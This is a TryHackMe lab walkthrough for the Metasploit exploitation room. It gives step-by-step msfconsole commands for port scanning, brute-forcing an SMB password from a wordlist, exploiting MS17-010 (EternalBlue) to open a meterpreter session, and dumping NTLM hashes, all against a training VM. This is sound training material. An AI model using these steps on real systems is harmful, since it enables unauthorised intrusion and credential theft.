# THM - Metasploit:Exploitation

## Introduction

For this room there is a wordlist that can be downloaded if you want to run the room over a VPN connection, but the same wordlist is in the Attackbox under ```/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt```

Start the Attackbox (or local VPN connection) and run ```msfconsole``` to start the room

## Scanning

### Port Scanning

After the machine loads and the msfconsole has started, search for port scanners by running ```search portscan```

For the demonstration we will be using ```auxiliary/scanner/portscan/tcp```

Start it with ```use auxiliary/scanner/portscan/tcp```

Verify the options needed with ```show options```

Picture here

Note that from the metasploit console you can run an nmap scan as you would from a normal CLI, but metasploit might be faster.

### UDP service identification

The auxiliary module ```scanner/discovery/udp_sweep``` can identify services running over UDP.

### SMB scans

The auxiliary modules ```scanner/smb/smb_version``` and ```scanner/smb/smb_enumshares``` can scan SMB services, but this example is just to show you that Metasploit can get more specific when you need it to do so.

### Section 2 questions

#### How many ports are open on the target system?

The hint here is: You can use the portscanner module on Metasploit.

So let's do that. Start the portscanner module we discussed earlier in Metasploit and set the RHOSTS value to the IP address of the machine we launched at the beginning.

Set RHOSTS with ```set RHOSTS [MACHINE_IP]```
Verify RHOSTS is correctly set with ```show options```
Start the exploit with ```exploit```
We will see the amount of services that are open on the target system.

#### Using the relevant scanner, what NetBIOS name can you see?

Type in ```back``` to get back to the main console
I searched the console for NETBIOS scanners
Picture
The question has the following hint: Use the netbios/nbname module.
So we'll use that
Fire it up with ```use auxiliary/scanner/netbios/nbname```
Show the options we need
picture
Looks like all we need to set is RHOSTS, which we will set using the same command we used earlier
Start the exploit with ```exploit```
And we get the answer

#### What is running on port 8000?

For this one we have this hint: Use the http_version module.
Let's search for it!
picture
Fire it up with ```use auxiliary/scanner/http/http_version```
Show the options
Notice how RPORT is set to port 80. This will need to change.
We'll use ```unset RPORT``` followed by ```set RPORT 8000```
Set the RHOSTS value and run ```show options``` to verify everything is correct
picture
Start the exploit with ```exploit```
And we get the answer

#### What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.

For this one we have this hint: Use the smb_login module.
Let's search for it!
picture
Fire it up with ```use auxiliary/scanner/smb/smb_login```
Show the options
We have a lot more options here and we'll need to set the ```SMBUser``` parameter to "penny" and the ```PASS_FILE``` parameter to the wordlist shared at the beginning of the room
Run ```show options``` to verify everything is correct
picture
picture
Start the exploit with ```exploit```
The exploit will start and run until a correct value is found
And we get the answer

## Metasploit Database

In an actual penetration test, there will be multiple targets. To simplify the project management and avoid possible confusion when setting up parameters, Metasploit has a database set up. 

1. Open a new terminal window or new tab
2. Start the PostgreSQL database with ```systemctl start postgresql``` (On local machine may need to use sudo)
3. Start the Metasploit Database with ```msfdb init```
4. Go back to msfconsole and check the DB status with ```db_status```

This database feature allows multiple workspaces to be created for different processes. The available workspaces are listed with the ```workspace``` command.
Workspaces can be added using the ```-a``` parameter and deleted using the ```-d``` parameter.
New workspaces are printed in red, and you can navigate to a specified workspace using ```workspace [workspace_name]```
The command ```workspace -h``` lists available workspace options.
The ```help``` command shows the Database Backend Commands menu.

If an Nmap scan is run using the ```db_nmap``` command, the results will be saved to the database.

Now you can see relevant information on the target system using ```hosts``` or ```services```, which can be appended with ```-h``` to show the available options.
After the host information is stored in the database, ```hosts -R``` can be used to add the value to the RHOSTS parameter

### Section 3 questions

Nothing will be tested here, just click "Submit"

## Vulnerability Scanning

Metasploit can quickly identify the "low hanging fruit", or easily identifiable and exploitable vulnerabilities, on a target system.
The ```search``` command can be used to find exploits for these services, and ```info``` shows more information about the usage and purpose.

### Section 4 questions

#### Who wrote the module that allows us to check SMTP servers for open relay?

Let's find this module starting with ```search smtp```
picture
This one looks promising, we can get more information by typing out the directory path or by specifying the number, ```info 23```
Look in the "Provided by:" for the answer

## Exploitation

Within the Metasploit framework, exploit is the most populated directory. As with every other directory, you can search for exploits and gather information with the ```info``` command.

Exploits will come with default payloads, but there might be other commands that can be used. These are shown with the ```show payloads``` command.
Once a payload has been chosen, set it with ```set payload [Payload_name_or_number]```
Choosing a working payload could take some trial and error due to environmental or OS restrictions.
You may need to set some new parameters when a payload is changed, and those are shown with the ```show options``` command.
When a session is opened, you can background it with ```CTRL+Z``` or abort it with ```CTRL+C```
The ```sessions``` command lists active sessions, and these sessions can be interacted with using the command ```sessions -i [SESSION_ID]```

### Section 5 questions

#### Exploit one of the critical vulnerabilities on the target VM

The hint here is "The target is missing the MS17-010 patch." So we'll need to search for a vulnerability to exploit that.
Using the command ```search ms17-010```, we find the eternal_blue exploit
Start the exploit and lists the options
Define RHOSTS
Start the process on the remote host using the ```exploit``` command
This should set up a meterpreter session
Use Linux commands like ```pwd``` to determine where you are in the file structure

We've exploited the critical vulnerability, so click 'Submit'

#### What is the content of the flag.txt file?

We need to find the flag file. Luckily, meterpreter has a way to search.
Type in ```search -h``` to see the available options
We can see from the output that ```search -f``` will let us search for a file using a glob
Let's try it by typing in ```search -f *flag*```
And we see the location of a flag.txt file!
Use ```cd``` to get to the directory where the flag file is located, and use ```cat``` to dump the contents

#### What is the NTLM hash of the password of the user "pirate"?

Don't leave the session yet, we still need it. Background the session for now.
Look at the hint: Use hashdump
So let's search for hashdump
Number 17 looks interesting, "post/windows/gather/hashdump".
Start it and show the options
We need to specify the session, so find your background session using the ```sessions``` command.
Set the session value to the session ID of your background session
Run ```exploit```
Look for the "pirate" user in the password hash dump and that's where you'll find the answer.

## Msfvenom

## Summary